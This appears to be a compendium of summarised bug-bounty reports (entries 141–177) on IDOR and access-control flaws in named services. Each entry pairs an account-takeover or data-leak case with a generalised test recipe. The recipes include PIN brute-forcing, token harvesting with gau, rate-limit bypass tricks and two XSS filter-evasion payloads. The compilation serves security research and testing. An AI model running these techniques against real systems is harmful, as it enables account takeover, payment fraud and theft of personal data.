### [141] iOS app — email-as-`UID` profile IDOR (view/update→ATO) + no-rate-limit OLD_PIN brute — Raj Singh [NEW: email-as-id + old-secret brute; iOS bypass stack]
- Where: iOS app (bypassed jailbreak detection w/ Liberty, SSL pinning w/ SSL Kill Switch 2 + Frida/objection); profile view/update keyed by `UID=<email>`.
- Approach/how-found: swapping `UID` to a victim's email returned/edited their profile — the server validates only the email, not the session. Updating `MOBILE` to attacker's number → forgot-password recovery PIN to that number → ATO. Separately, the change-PIN call (`OLD_PIN`,`NEW_PIN`) had no rate limit → brute the victim's 4-digit OLD_PIN → ATO.
- Test: when the object key is an email/username (not session-derived), swap it on read+write; update a phone/email field then trigger recovery; brute any "old PIN/password" field lacking rate limiting. Bypass mobile defenses (jailbreak/SSL pinning) first to see the API.
- Q: "Is the profile keyed by a client-supplied email/username (no session check)? Can I update the recovery phone then reset? Is the old-PIN/old-password field rate-limited?"

### [142] Airline — `/Admin/User/Activate` reachable with your own email-confirm token; `User.Id` in the body is IDOR → mass ATO — Sazouki [NEW ★ admin activate endpoint + token reuse + id mass-assignment]
- Where: subdomain signup needs admin approval; `POST /Admin/User/Activate` with `User.Id=...&User.NewPassword=...`.
- Approach/how-found: directory/endpoint fuzzing (gospider) found `/Admin/User/Activate` → "Invalid Token" → he added the **token from his own confirmation email** → now allowed to edit account details + set a new password; the body's `User.Id` → change to a victim's id → set the victim's email + password → ATO of any account (bypassing admin approval).
- Test: fuzz for admin/activate/approve endpoints; feed them tokens you legitimately received (email-confirm/invite) — they may be accepted out of context; then swap the `User.Id`/`id` in the body to act on other accounts.
- Q: "Is there an admin activate/approve endpoint that accepts my own email/invite token? Does its body carry a `User.Id` I can swap to set another account's email/password?"

### [143] Instagram (`$49,500`) — change ANY user's reel thumbnail via `POST /api/v1/media/configure_to_clips_cover_image/` swapping `clips_media_id` — Neeraj Sharma [DUP-reinforce: media-edit endpoint keyed on a media id, no owner check; explore a brand-new feature]
- Where: Instagram reels "edit cover photo/thumbnail"; `POST /api/v1/media/configure_to_clips_cover_image/` with the reel's `clips_media_id`.
- Approach/how-found: started on Instagram Ads GraphQL (dry), pivoted to the reels section, found the cover-photo edit feature, intercepted his own thumbnail change, then swapped `clips_media_id` to a victim's reel id → changed any user's reel thumbnail (incl. high-profile accounts).
- Test: media-edit/cover/crop/caption endpoints reference the media by id — swap it to a foreign media id to modify others' content. Prioritize newly shipped features (reels cover edit) on big targets.
- Q: "Does this media-edit action (cover/thumbnail/caption/crop) authorize by media-id only? Can I swap `media_id`/`clips_media_id` to modify another user's media?"

### [144] Chain two trivial IDORs → cross-org ATO (precondition created by IDOR #1) — r29k/Sheraz Khalid [NEW: chained-IDOR precondition]
- Where: helpdesk app (admin/manager/user). IDOR#1: dept-assign request carries a manager id → swap to add ANY manager (even another org's) to your department. IDOR#2: user-edit password-change carries user id → swap to change a manager's password. Alone, each is minor.
- Approach/how-found: password-change worked then 403'd during PoC — the tell was that IDOR#2 only works for managers **currently in your department**. So: IDOR#1 to pull the target manager into your dept → IDOR#2 to reset their password → log in. Reaches admins in other orgs.
- Test: when a write IDOR intermittently 403s, look for a RELATIONSHIP precondition (membership/department/team) you can satisfy with a *different* IDOR first.
- Q: "Does this write fail due to a membership/relationship requirement I can manufacture via another IDOR (add to team/dept/share) first? Can two minor IDORs chain into ATO?"

### [145] Param Miner unlocks a blocked IDOR — hidden param `?wy0kvoly1=1` bypasses the check; reset-to-any-number → ATO — RyuuKhagetsu [NEW ★ discover a bypass param via Param Miner]
- Where: `/api/siswa/<id>` (student) IDOR; direct id-swap returned nothing.
- Approach/how-found: ran Burp **Param Miner** "guess headers/params" on the endpoint → it found an accepted param (`?wy0kvoly1=1`) that, when added, returned other accounts' data (a cache/authz buster) → then forgot-password sent the reset to *any* number without validation → ATO.
- Test: when an id-swap is blocked, run Param Miner (guess params + headers) — a hidden/undocumented param can flip caching or authz and unlock the IDOR. Then check whether reset/recovery accepts an arbitrary phone/email.
- Q: "Did Param Miner reveal a hidden param/header that bypasses the block on this id-swap? Does password reset accept an arbitrary recovery number?"

### [146] PayPal/Braintree — public `billingAgreementToken` reused at the unauth merchant nonce endpoint → PayPal PII + payment fraud; harvest ba_tokens from Wayback/gau/GA — h4x0r_dz [NEW ★ payment token leaked in URLs → reuse]
- Where: `POST api.braintreegateway.com/merchants/<merchantID>/client_api/v1/payment_methods/paypal_accounts` (should be merchant-authenticated; isn't).
- Approach/how-found: the endpoint generates a payment-method Nonce from a `billingAgreementToken`; sending a *victim's* ba_token returns their PayPal billing address/email + a usable Nonce → make a payment from the victim's PayPal. ba_tokens are *public* (passed in GET) and leak everywhere: `gau paypal.com | grep ba_token`, Google dorks, third parties (Google Analytics). Merchant IDs (e.g. Grammarly's public client id) are limited and discoverable.
- Test: tokens passed in GET URLs (ba_token, agreement/session tokens) leak into Wayback/gau/CommonCrawl/Analytics — harvest and replay them at the (often unauthenticated) endpoint that consumes them. Check whether a "merchant-only" API actually enforces merchant auth.
- Q: "Is a payment/agreement token passed in a URL (archived/leaked)? Can I harvest it from Wayback/gau and replay it at an endpoint that should require merchant/server auth?"

### [147] Salesforce Community Aura IDOR — `getItems(entityNameOrId=ContentDocument)` lists 900+ doc ids → download internal files — Mohamed Taha (IBM) [NEW ★ Salesforce Aura mass-data technique]
- Where: Salesforce-hosted community (`*.force.com`/`*.live.siteforce.com`); `POST /s/sfsites/aura`.
- Approach/how-found: found IBM's Salesforce community via CNAME recon (subdomains → `*.live.siteforce.com`). Replayed the Aura endpoint with the `selectableListDataProvider getItems` action and `"entityNameOrId":"ContentDocument"` → returned 900+ ContentDocument ids (069…) → bash-looped `/sfc/servlet.shepherd/document/download/<id>` → downloaded internal documents/images.
- Test: on Salesforce communities, hit `/s/sfsites/aura` with the `getItems` action and swap `entityNameOrId` (ContentDocument, User, Case, Account) to dump records the UI hides; download files via the shepherd endpoint. Find Salesforce assets by CNAME (`force.com`/`siteforce`).
- Q: "Is this a Salesforce community? Does the Aura `getItems` action let me enumerate `ContentDocument`/`User`/`Case` ids and download them via `/sfc/servlet.shepherd/document/download/`?"

### [148] TikTok Business — low-priv Analyst closes ANY advertiser account via `account_id` swap — anon (H1) [DUP reinforcement: destructive IDOR + role bypass]
- Where: `POST /api/v2/bm/account/close {account_id, org_id}`.
- Approach/how-found: the "Close Account" action was exposed to the low-priv Analyst role, and swapping `account_id` closed any user's advertiser account (no ownership/role check). The 19-digit non-incremental id capped severity (needs id discovery).
- Test: destructive actions (close/delete/deactivate) often lack both role checks and ownership checks — test from the lowest role and swap the object/account id.
- Q: "Can a low-priv role perform a destructive action, and does swapping the `account_id` hit other tenants?"

### [149] Seller-account takeover via `switchSellerContext` IDOR (context switcher not authorized) — pwnsec (India e-commerce, 9.8) [NEW ★ account/context-switch IDOR]
- Where: `POST /seller/switchSellerContext` after login (choose which seller account to enter).
- Approach/how-found: the context switcher doesn't verify ownership — intercept and change the seller-account name/id to a victim's → full admin access to their seller dashboard (change bank details, view orders + customer delivery addresses).
- Test: any "switch account/profile/workspace/tenant/context" action is a prime IDOR — swap the target id/name; these switchers frequently grant the target's full privileges without an ownership check.
- Q: "Does a switch-account/context/workspace request let me select another user's account and inherit their privileges (bank/orders/admin)?"

### [150] Job-portal CV bugs — submit-own-CV-to-victim's-application (PUT ids) + CV download where a 302 leaks data via `Content-Disposition` — tobydavenn [NEW: cross-container submit + 302-header data leak]
- Where: CV submit `PUT {cvId, jobApplicationId}`; CV download by UUID.
- Approach/how-found: couldn't add others' CVs to his profile, but could submit *his* CV to *another user's* job application (swap `jobApplicationId`) → invalidate/alter others' applications. Separately, downloading a CV by a swapped UUID returned `302` with no body, but `Content-Disposition` leaked the victim's CV filename — and when a CV was stored in plaintext, the response exposed all its data. (Also: deferred-render iframe `onload` stored XSS; magic-bytes PDF→.html file-upload RCE.)
- Test: test writes in *both* directions (my object → victim's container, and victim's object → my container). On downloads, inspect 3xx responses and headers (`Content-Disposition`, `Location`) — they leak filenames/data even with an empty body.
- Q: "Can I submit my object into another user's container by swapping the container id? Does a 302/empty download response leak the victim's filename/data in headers?"

### [151] Gift-flow base64 id → PII; decode/decrement/re-encode, read source for bank+email — Mariam (P1) [DUP reinforcement: base64 id + hidden source PII]
- `id=NzYwNDU%3D` → URL+base64 decode → `76045` → decrement → other gift recipients; the page source leaked email/bank/name beyond what's rendered; Python to automate.
- Q: "Is the id base64-of-a-number, and does the source carry bank/email/PII beyond the rendered view?"

### [152] University subdomain — classic numeric `id` in URL → list/edit all users — Bishoo97x [DUP reinforcement: enumerate + edit]
- `?id=<n>` in the profile URL → change to read any user's email/name and edit their info; Intruder to enumerate all. Universities/subdomains are soft targets.
- Q: "Does a profile URL `id` let me read and *edit* arbitrary users (Intruder to confirm mass scope)?"

### [153] Account-export download IDOR — download any user's full data export — Najam Ul Saqib [NEW: target data-export/download features]
- Where: an API that downloads "account exports" (full account info).
- Approach/how-found: testing API IDORs on root domains (no subdomain recon), he found the account-export download accepted another user's id/reference → download any user's full export. (Details NDA'd; single-line summary in the write-up.) Methodology: consistency over recon — stuck to root domains and hammered API id params daily.
- Test: hunt data-export / "download my data" / GDPR-export / report-download endpoints — they bundle an account's full info and are frequently keyed by a swappable id with weak authz. Root-domain APIs are full of IDORs.
- Q: "Is there an account-export / data-download / report endpoint keyed by a swappable id that returns another user's full data?"

### [154] TikTok SMB (WordPress) — profile-edit `u_id` IDOR → ATO; target found via an ad email — Ahmad A Abdulla ($1,000) [DUP reinforcement: WP theme `u_id` IDOR + ad-sourced asset]
- Where: `POST /wp-content/themes/tiktok/includes/user/user.php action=profile_edit` with `u_id=1504`.
- Approach/how-found: the asset (`tiktoksmbacademyeu.com`) came from a marketing email/ad. The profile-edit body has `u_id` (sequential); change 1504→1505 → set another account's email+name → ATO (also XSS + missing CSRF token). Two accounts ended with one email = IDOR confirmed.
- Test: WordPress custom-theme endpoints (`/wp-content/themes/.../user.php`) often carry a `u_id`/`user_id` with no authz; sequential → enumerate. Add assets seen in ads/marketing emails to scope.
- Q: "Does a WP theme/plugin endpoint carry a sequential `u_id`/`user_id` for profile edit (→ ATO)? Did I add ad/email-sourced domains to scope?"

### [155] Airline group: member-profile IDOR + remove resetToken field → mass ATO (CVSS 10) — tarekbouali [NEW: omit the token field]
- Where: unified SSO; `/api/members/<id>/profile` (unauth → email; enumerate thousands), password-change request with reset `key`.
- Approach/how-found: reset link `?key=`; the change-password body variations all errored until he **fully removed the `resetToken` field** → `HTTP 204`, password changed on his second account → ATO at scale (credit cards saved across the group's sites).
- Test: on reset/change-password, try blanking AND fully omitting the token/resetToken/credential field; enumerate `/members/<id>` for email harvest.
- Q: "Does omitting (not just blanking) the resetToken/credential field make the password change succeed? Is the member-profile endpoint unauthenticated and enumerable?"

### [156] iCloud CloudKit: title hidden in URL hash but leaked unauth via records/resolve by ShortGUID — xdavidhu [NEW: hash-is-not-protection]
- Where: `POST /database/1/com.apple.cloudkit/.../records/resolve` body `{"shortGUIDs":[{"value":"<ShortGUID>"}]}`.
- Approach/how-found: shared-file links put the document title in the URL **hash** (`#title`) — implying it's meant to stay client-side/private. But the resolve endpoint returns `share→fields→cloudkit.title` **and the owner**, unauthenticated, even when sharing = "Only people you invite". Knowing the ShortGUID isn't privileged.
- Test: anything stashed in a URL fragment/hash "for privacy" — check whether a resolve/preview/metadata endpoint returns it server-side by the object/share id, without auth.
- Q: "Is sensitive data only hidden in the URL hash? Does a resolve/preview endpoint leak it (and the owner) by share-id without authentication?"

### [157] Support/contact-us form — account DELETION on behalf of victim: email field unchangeable in UI but editable in the intercepted request; no verification ticket is from the owner — pwnsec.ninja [NEW: support-ticket IDOR/BAC → account closure]
- Where: contact-us / support form submit request, `email`/`subject=Close Account` field.
- Approach/how-found: the form locked the email field in the UI; intercept the submit and change `email` to the victim's, subject "Close Account". Support team actioned the closure with no verification that the requester owned the account → victim's account closed (DoS/ATO-adjacent).
- Test: any "request via support/contact form" flow — change the locked identity field (email/account id) in the request to act on another user; human-actioned tickets rarely verify ownership.
- Q: "Can I submit a destructive support request (close/reset/refund) on behalf of a victim by editing the locked email/account field in the request? Does support verify ownership?"

### [158] Research lab: can't READ files (IDOR) but can RUN JOBS on others' files — machevalia [NEW: process-it-without-reading-it]
- Where: `/file?id=10001` (view blocked) vs `POST /jobs?file1=10002&file2=10003` (compute).
- Approach: direct file read via id-swap returned nothing usable, but the job/processing endpoint accepted other users' file ids and ran computations on their private data → access-control violation (and results leak).
- Test: if direct read is blocked, target the endpoints that *operate on* the object (run/compute/convert/render/export/share) with the victim's id.
- Q: "If I can't read the object, can a processing/job/render/export endpoint act on the victim's object id and return results?"

### [159] Media-company SSO — "unguessable" 32-char UID leaked via `.json` on group endpoint → changeEmail dumps PII+hashes → profile-update keyed by id+email = full ATO — tobydavenn [NEW ★ chain: id-leak hunt + id+email-as-selector ATO]
- Where: company SSO site; password-reset endpoint reflected a ~32-char UID; group "join" endpoint (`+.json`); `changeEmail` endpoint; profile-update endpoint (identifies account by UID+email).
- Approach/how-found: brute-forcing the 32-char UID got 403 (no UA/IP bypass). Instead of quitting, he recalled "never give up on hard UIDs — find where they leak." Appending `.json` to the group-join endpoint dumped **every member's UID**. Feeding a UID to `changeEmail` returned all PII incl. password hashes. The profile-update endpoint decided "which account" from a client-supplied **UID + email** (not session) → set victim's UID+email → change anything incl. password = ATO. Bonus reflected XSS via open redirect.
- Test: when an id looks unguessable, hunt leaks (member/group lists, `.json`/`.xml` suffix, search, autocomplete) before abandoning. Once you hold an id, replay it into EVERY id-keyed endpoint (read, change-email, profile-update). Flag any "update" that identifies the target by body id/email instead of the session.
- Q: "Where does this app leak the 'hard' id (group lists, `.json` suffix, search)? Does any state-changing endpoint pick the target account from a client-supplied id+email rather than my session token?"

### [160] Rivals (Yahoo) iOS — `POST /api/v1/user/{id}/follow`: denied 422 BUT error body leaks full user record (email, salt, hashes) → 3.5M PII — dhakal_bibek ($9,500) [NEW ★ "denied action leaks object in error message"]
- Where: jailbroken iPhone + Burp (mobileAssistant); mobile API `POST /api/v1/user/3123XXX/follow`.
- Approach/how-found: proxied the iOS app, swapped the numeric path id to a random one → got **422 Unprocessable Entity**, but the error message embedded the *entire* target user DB row (email, username, role, salt, hashes, ids). Numeric id → trivially enumerable → 3.5M users. Found in ~20 min.
- Test: never judge an id-swap by status code alone — read 4xx/5xx bodies; "not allowed to follow #<User …>" style errors dump the very object you were denied. Proxy mobile apps (jailbreak/Frida + Burp); social actions (follow/block/friend) with numeric path ids are prime.
- Q: "Does the error response for a denied id-swap still leak the target object's data? Is the mobile API echoing full records in validation/exception messages?"

### [161] Subdomain admin panel — client-side `window.location` redirect bypass → JS-mined endpoint → `POST id=1` deletes admin avatar (IDOR) — Rizaldi Wahaz [NEW: JS-redirect gate ≠ authz + endpoint mining]
- Where: admin subdomain (found via subfinder/sublist3r); endpoint discovered in JS; `POST ... id=1`.
- Approach/how-found: subdomain enum → admin login page. The "gate" was a client-side `<script>window.location="/login"</script>`. Bypassed by disabling JS / saving source locally / commenting the redirect → admin UI rendered. Read the included JS files, found an interesting endpoint, fired it via Postman with `id=1` → `{"success":true}` → deleted the admin's avatar (no server-side authz).
- Test: a JS `window.location` redirect is not access control — disable JS, save the page, or comment the redirect to reach gated UI. Always read every included JS file for endpoints and call them directly with `id=1`/low ids.
- Q: "Is this protected page only gated by a client-side JS redirect? Which endpoints does the JS reference, and do any accept `id=1` without server authz?"

### [162] Adobe — WAF-heavy: harvest every param with gauplus+httpx, grep `id=`/`confidential`; `/document/{id}` sequential, one increment looked dead but Intruder 100–1000 leaked internal docs — Ravaan (Medium 5.3) [NEW: don't dismiss IDOR on one increment + mass param harvesting]
- Where: `/document/{id}` (sequential numeric) on a WAF-protected Adobe asset.
- Approach/how-found: against a heavy WAF he pivoted to "slight manipulation" (IDOR). Collected all endpoints/params: `gauplus --subs -b png,jpg,... -o urls`, then `httpx -mc 200`, then grepped for `id=`, `confidential`, `secret`, `employee`. `document/200`→`201` returned nothing (almost concluded "no IDOR"), but Burp Intruder over 100–1000 surfaced many confidential/internal docs (sort by length/status).
- Test: never dismiss IDOR after one neighbor id — fuzz a wide range and sort by length/status (empty/unused ids hide real ones). Use gau/gauplus + wayback + httpx to enumerate ALL id-bearing endpoints across a large scope before testing.
- Q: "Did I conclude 'no IDOR' from a single id±1? Have I fuzzed a wide id range and sorted responses? Did I harvest every id-bearing endpoint via gau/wayback first?"

### [163] Microsoft Partner / Azure ISV — 8-digit "random-looking" sellerId is sequential; `GET .../{sellerId}/users` step ±10 dumps other publishers; no rate-limit → thousands — Meareg [NEW: long ids can be evenly-spaced; diff two known ids]
- Where: `partner.microsoft.com GET /en-us/dashboard/account/.../{sellerId}/users` (8-digit sellerId).
- Approach/how-found: sellerId looked random but two owned ids differed by a constant; stepping `+10`/`-10` returned neighboring publishers' users with no authz check (relied only on a valid session). No rate limiting → Python script extracts thousands incl. internal Microsoft teams (blockchain, AKS Engine).
- Test: "long/8-digit therefore safe" is false — diff two ids you legitimately own to detect sequential/even spacing (here ±10), then enumerate. B2B seller/org/publisher endpoints frequently skip per-tenant authz.
- Q: "Is this long id actually sequential or evenly spaced? What's the numeric step between two accounts I control? Does the org/seller endpoint verify tenant ownership or just a valid session?"

### [164] YouTube — read a video's HIDDEN dislike count via the copyright "removal request" flow: `POST /youtubei/v1/creator/get_creator_videos` `videoIds:["<victim_video_id>"]` returns `likeCount`/`dislikeCount` — Alessandro Rumampuk (Google VRP $500) [DUP-reinforce of [243]: a DIFFERENT secondary endpoint leaks the privacy-hidden metric]
- Where: YouTube Studio → Copyright → Removal requests → New removal request → Add a video; underlying `POST /youtubei/v1/creator/get_creator_videos` with `videoIds:["<id>"]`.
- Approach/how-found: when YouTube made dislikes private, he probed whether the value was hidden everywhere; the copyright-removal "add a video" lookup returned the full creator-video object (incl. like/dislike counts) for ANY video id, bypassing the privacy setting (a second, independent leak path from his featured-video bug [243]).
- Test: a newly "made private" field is rarely scrubbed from every internal endpoint — hunt admin/creator/moderation/copyright/lookup flows that resolve an arbitrary object id and return its full object server-side.
- Q: "Which other internal flow (copyright/report/lookup/picker) resolves a video/object id and returns the field that's supposed to be private now?"

### [165] Confidential reports — IDOR+BAC chain: 403-vs-404 name oracle; direct read blocked, so pivot to clone/add-collaborator that trust client source-id (Referrer-only guard) — tobydavenn (Critical+High+Med) [NEW ★ indirect-action IDOR via clone/share + Referrer-only check]
- Where: report GET (report-name param); clone-report (hidden "source report" param, guarded only by Referrer); add-user-to-report; report image URLs (unauth).
- Approach/how-found: wrong report name → **403** (exists, not yours) vs **404** (absent) = oracle to harvest valid names. Session id too random to brute. So he used indirect actions: the **clone** feature only showed owned reports client-side, but tampering the hidden source-report id past the client cloned *any* user's report into his profile — server's only guard was a (spoofable) Referrer. Same trick on **add-user-to-report** added himself to a victim's report. Also unauth view/delete of report images (PII).
- Test: use 403-vs-404 to enumerate valid ids/names. When direct GET is protected, pivot to clone/copy/duplicate/share/add-collaborator endpoints that ingest a source-object id — they often check only Referrer/Origin (spoofable), not ownership. Always test unauth access to uploaded files.
- Q: "Does 403-vs-404 leak existence? Can I reach a protected object indirectly via clone/copy/share/add-member that trusts a client-supplied source id and only checks Referrer?"

### [166] Instagram "Interests" — brand-new feature embeds own user-id in write body; swap → add/modify/delete any account's interests — Nawaf Alkhaldi ($4,300) [NEW: hunt newly-shipped features; self-id in write body]
- Where: Instagram "Interests/Topics" feature; POST body carried the caller's own user id.
- Approach/how-found: a newly-released feature → inspected its write request → found his own account id in the post-data → swapped to another account's id → write succeeded → add/modify/**delete** any user's interests.
- Test: brand-new / recently-shipped features are under-tested — inspect their write requests for a self user-id in the body and swap it. Modify/delete (not just read) confirms impact.
- Q: "Does this newly-added feature put my own user id in its write request body? If I swap it, can I create/modify/delete another user's data?"

### [167] Mozilla support (kitsune) — IDOR found by READING the open-source code: `question reply` view honors a `delete_images` POST param that deletes any image id with no owner check — noob3xploiter ($1,500) [NEW ★ source-code review to find a hidden/legacy IDOR param]
- Where: Django `questions.reply` view (`^/(?P<question_id>\d+)/reply$`); undocumented `delete_images` POST param.
- Approach/how-found: practicing static analysis on GitHub projects, he downloaded kitsune (powers support.mozilla.org). The `reply` view deleted any image whose id was in `delete_images` WITHOUT the owner check that the real image-delete function had. Not referenced in the frontend (legacy snippet) — only findable by reading code. Confirmed on staging with permission.
- Test: when the app is open-source (or JS is readable), DIFF similar handlers — one path enforces ownership, a sibling/legacy path doesn't. Hunt for action params (`delete_images`, `*_id`) not exposed in the UI.
- Q: "Does the source contain a legacy/secondary handler for this object that skips the ownership check the main handler has? Are there hidden action params I can send?"

### [168] Meta — trim ANY private live video by known `video_id` → trim mutation regenerates a NEW video id → second GraphQL returns its CDN link — abdellah yaala ($7,500) [NEW ★ derivative-object IDOR: transform a private object into a new readable one]
- Where: `business.facebook.com POST /api/graphql/`; mutation `doc_id=3859231820860792` (trim by `video_id`), then `doc_id=3561288230642336` (video_id→CDN).
- Approach/how-found: with a victim's private live `video_id`, the trim mutation (with attacker `actor_id`/page) trims 15s and **regenerates a new video id**; a second GraphQL call resolves that new id to a CDN URL → watch the private video.
- Test: "transform/edit" operations (trim, crop, convert, thumbnail, re-encode, export) that accept a target object id often emit a NEW derivative object you own/can read — bypassing the original's ACL. Hunt operations that regenerate ids, then resolve the new id.
- Q: "Can a transform/edit mutation on someone's private media produce a new derivative object (new id/CDN link) I can read, sidestepping the original ACL?"

### [169] Glints (4 bugs): public JobId IDOR, ORM attributes= field leak, resume→S3 path, guest GraphQL — huli [NEW: ORM attributes= + file→S3]
- Where: job platform.
- Approach/how-found: (1) `jobApplications?where={"JobId":"<uuid>"}` — JobId is public (in job URLs) → swap to other companies' jobs → all applicants' PII. (2) RSS feed needed a secret `RSS_ID`; the company-jobs API used **Sequelize** ORM, so he injected `attributes=rssId` (Sequelize field selector) → the response coughed up the hidden rssId + owner id. (3) public-profile API redacts phone/email but leaks the `resume` **filename**, and all resumes live at a fixed S3 path `glints-dashboard.s3.../resume/<filename>.pdf` → download anyone's; harvest user ids via `inurl:profile/public site:glints.com`. (4) hidden `superpowered.glints.com` JS contained a `findRecruiters` GraphQL query callable as guest → all recruiters' PII.
- Test: feed public ids (JobId) to data APIs; on Sequelize/ORM backends add `attributes=`/`fields=`/`include=` to surface hidden fields; turn a leaked filename into a predictable S3/CDN URL; google-dork id-bearing public URLs; replay GraphQL queries found in JS as an unauthenticated guest.
- Q: "Is the object id public elsewhere? Can an ORM `attributes/fields/include` param leak a hidden id? Does a file field map to a guessable S3/CDN path? Is a GraphQL query from JS callable unauthenticated?"

### [170] Two-bug ATO — API IDOR (`POST /Account?handler=GetUserData`, id in body) leaks victim ids; client posts a session object (id/rights/perms) the server trusts → swap → full ATO — Kwadwo Amoako [NEW ★ client identity-object replay]
- Where: `POST /xyz.com/Account?handler=GetUserData` (id in POST body); client-side "User Account" JS holds a session object {id, rights, permissions} posted back to the API as the identity.
- Approach/how-found: IDOR #1 — swap id in the GetUserData body → victim data (incl. their ids). Static JS review revealed the account page sends a **client-held session object** (id + rights + perms) to the API as the source of truth. Reload account page, intercept, replace own ids with victim's → full account access → changed victim's password.
- Test: read client JS for an identity/session object (id, role, permissions) that's POSTed back and trusted server-side; swap its id to impersonate. Pair a data-leak IDOR (to harvest victim ids) with this identity replay = ATO. Static code analysis surfaces these.
- Q: "Does the client send back an identity object (id/rights/perms) the server trusts as 'who I am'? Can I swap it (using ids from an IDOR) to fully impersonate?"

### [171] Sony VDP — IDOR updates ANY user's phone via id+email swap; plus base64 `key` carries the OTP-expiry timestamp (forge it to brute OTP) and `%20`-in-email defeats lockout — cyberick [NEW ★ multi-bug recon set: phone-update IDOR + tamperable base64 timestamp + whitespace rate-limit bypass]
- Where: a Sony domain user-update request (swap `id`+`email` to victim → update their phone); password-reset response leaked a base64 `key` with an embedded timestamp; login lockout on `sonystyle.com.cn`.
- Approach/how-found: the profile-update endpoint trusted the `id`/`email` in the request → set a victim's phone number. Separately, the reset `key` param base64-decoded to include the OTP-expiry timestamp; replacing it with his own timestamp bypassed expiry → OTP brute. Rate-limit/lockout was bypassed by appending `%20` to the email (backend decoded it as the same user, throttle saw a different string). Also phpinfo files via dirsearch, file-upload→XSS (response returns file URL).
- Test: profile-update IDOR via id+email; decode base64/opaque `key`/`token` params for embedded timestamps/expiry you can rewrite; defeat lockout/rate-limit by mutating the identifier (`%20`, case, `+tag`, trailing dot) so the limiter keys differently while the backend normalizes it.
- Q: "Can I update a victim's phone/email by swapping id+email? Does an opaque `key` hide a timestamp/expiry I can forge? Does adding `%20`/case/dots to my email bypass the rate-limiter while resolving to the same account?"

### [172] Intigriti third-party chat plugin — derive ANY user's chat secret from their public `username`, take over their chat, turn self-XSS into ZERO-CLICK stored XSS — Ladecruze (€3,000) [NEW ★ secret/token derived from a public identifier via an unprotected generator → self-XSS escalated to stored-on-victim]
- Where: embedded chat vendor's auth flow: a request returns a `visitorId` hash (→ fetches the chat secret key); the hash-GENERATING request is keyed solely on `username` (usernames are public on the Intigriti leaderboard).
- Approach/how-found: spotted an unfamiliar (chat-vendor) domain in Burp. A markdown backtick code-block let `<svg onload=alert(document.domain)>` execute, but only as self-XSS (it altered a message coming FROM the WebSocket server). To escalate, he inspected the auth requests: `visitorId` hash → secret key; brute was infeasible (high entropy), so he found the request that RETURNS the hash and tampered each param → the hash derived only from `username`.
- Exploit: took a top hacker's username from the leaderboard → fed it to the hash-returning request → got their `visitorId`/secret → fetched & took over the victim's chat → injected `<svg onload=...>`; when the victim opens Intigriti, the chat renders → zero-click XSS. Plugin disabled next day.
- Test: when a "random" secret/token gates access, look for ANY endpoint that GENERATES/returns it from a weaker input (username/email/id) with no authz — derive the victim's secret instead of brute-forcing. A self-XSS becomes stored/zero-click the moment you can write into a channel that renders on the victim (chat/profile/notification you can take over).
- Q: "Is this secret/token derivable from a public identifier (username/email) via an unprotected generator endpoint? Can I take over the victim's chat/channel and turn my self-XSS into stored, zero-click XSS on them?"

### [173] E-commerce — order/invoice fetch by sequential number leaks PII + payment-receipt image; reset response leaks a usable token (≠ email token) → chain to ATO — Damaidec (P1-ish) [NEW: invoice IDOR + reset-token-in-response]
- Where: order-history item fetch `.../item/{n}` (sequential); password-reset flow (token leaked in HTTP response, distinct from the email token but accepted); admin panel also leaks token.
- Approach/how-found: post-purchase "view order" fetched an item by sequential number → swap → other customers' PII (billing, receipt) incl. the payment-receipt image URL. Reset flow returned a token in the Burp response that still completed the password change → reset bypass. Combining the email-leaking IDOR with the reset-token leak → ATO.
- Test: order/invoice/receipt views keyed by sequential ids leak full PII + receipt-image links. On reset, diff the token in the HTTP response vs the email — if the response token is accepted, it's a bypass; chain with an email-IDOR for ATO.
- Q: "Does the invoice/order endpoint leak PII + receipt image by sequential id? Does the reset HTTP response leak a usable token? Can I chain email-IDOR + reset-token leak into ATO?"

### [174] XSS filter evasion + IDOR — stored XSS and IDOR on the same `customerID` endpoint; IDOR is the delivery vehicle for the payload to victims — systemweakness ($800) [DUP reinforcement: IDOR delivers XSS; filter-break technique]
- Where: a customer endpoint vulnerable to BOTH IDOR (customerID) and stored XSS.
- Approach/how-found: stored XSS landed via filter evasion: `" onf<x>ocus="alert(document['cookie'])" autofocus">` (junk `<x>` splits the blocked `onfocus`; `autofocus` = zero interaction). Since other customerIDs can't be guessed, the IDOR provides delivery — create a customer object carrying the payload, share its (IDOR-reachable) link → executes in the victim's browser → ATO/data theft.
- Test: when XSS needs a victim to view attacker data, an IDOR-reachable shared object is the carrier. Defeat keyword filters by splitting the handler with a junk tag (`onf<x>ocus`) and trigger with `autofocus`/`onerror` for zero-click.
- Q: "Can an IDOR-reachable object carry my stored-XSS to a victim? Can I evade the filter by splitting the event handler with a junk tag and fire it via autofocus?"

### [175] Instagram Shop — `merchant_id` in the "send invoice" DM controls the displayed seller identity → swap to any (verified) account = brand/identity spoof for scams — Nawaf Alkhaldi ($1,000) [NEW ★ IDOR as identity spoofing, not data read]
- Where: Instagram DM "shops send invoice to customer" feature; request `merchant_id` determines the seller username/avatar shown.
- Approach/how-found: the displayed seller identity is taken from a client-supplied `merchant_id`, not the authenticated sender. Swap it to any user id (e.g., @Instagram verified) → the recipient sees an order/invoice "from @Instagram ✓" though it came from the attacker → high-impact phishing.
- Test: wherever a message/invoice/notification/order renders a sender/seller/brand identity, check if that identity comes from a client-supplied id you can swap → impersonation (impact is trust/phishing even with no data read).
- Q: "Is the displayed sender/seller/owner identity derived from a client-supplied id rather than my session? Can I spoof a verified/brand account by swapping it?"

### [176] Reset-password IDOR: id in URL segment + hidden HTML field leaks it — hckrt/venomnis [DUP reinforcement]
- Reset URL `…/reset-password/0-57-<token>` and POST body `id=57`; swap 57→58 → reset any user. The page also leaked the id in a hidden input `<input type=hidden name=id value=57>` next to the email → harvest + enumerate. Q: covered by reset-IDOR + hidden-field-id-leak.

### [177] Small-scope target — fuzz Seclists + inspect EVERY request → `/endpoint/{id}/info` (signup id) → Intruder leaks others' ID, auth_details, org name, private subdomain info — annonymous [DUP reinforcement: per-account /{id}/info exposes infra metadata]
- Where: `/endpoint/{id}/info` keyed by the unique id assigned at signup.
- Approach/how-found: small scope → fuzz wordlists + manually capture/inspect all requests. The per-account info endpoint keyed by the signup id → Intruder sniper over id → other users' ID, auth_details, Org_name, and private subdomain info.
- Test: on small-scope targets, replay every captured request manually; "/{id}/info" account endpoints frequently expose auth/org/infrastructure metadata, not just profile fields. Miss no endpoint.
- Q: "Is there an `/{id}/info` account endpoint returning auth/org/infra metadata when I swap the id? Have I manually reviewed every request, not just the obvious ones?"

